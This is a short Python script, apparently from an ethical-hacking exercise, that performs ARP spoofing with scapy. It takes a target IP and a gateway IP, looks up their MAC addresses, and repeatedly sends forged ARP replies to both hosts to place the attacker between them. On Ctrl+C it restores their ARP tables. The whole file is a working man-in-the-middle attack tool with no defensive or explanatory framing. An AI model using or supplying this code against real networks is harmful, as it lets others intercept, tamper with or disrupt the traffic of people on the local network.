import scapy.all as scapy
import argparse
import sys
import time

def get_args():
    args = argparse.ArgumentParser()
    args.add_argument("-t","--target",dest="target_ip",help="Input for target ip")
    args.add_argument("-g","--gateway",dest="gateway_ip",help="Input for gateway ip")

    (options) = args.parse_args()
    return options
options = get_args()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_ether = broadcast/arp_request
    ans_list = scapy.srp(arp_ether, timeout=1, verbose= False)[0]
    return ans_list[0][1].hwsrc

def spoof(target_ip, target_mac, spoof_ip):    
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):    
    destination_mac = get_mac(destination_ip)    
    source_mac = get_mac(source_ip)    
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)    
    scapy.send(packet, count=4, verbose=False)

target_ip = (options.target_ip)
gateway_ip = (options.gateway_ip)
try:
    packets_sent_count = 0    

    target_mac = get_mac(target_ip)    
    gateway_mac = get_mac(gateway_ip)
    while True:
        spoof(target_ip,target_mac,gateway_ip)
        spoof(gateway_ip,gateway_mac,target_ip)
        packets_sent_count = packets_sent_count+2
        print("\r[+] Sent " + str(packets_sent_count),end='\r'),        
        sys.stdout.flush()        
        time.sleep(1.5)
except KeyboardInterrupt:    
        print("\n[-] Detected CTRL + C ... Resetting ARP tables..... Please wait.\n")
        restore(target_ip, gateway_ip)    
        restore(gateway_ip, target_ip)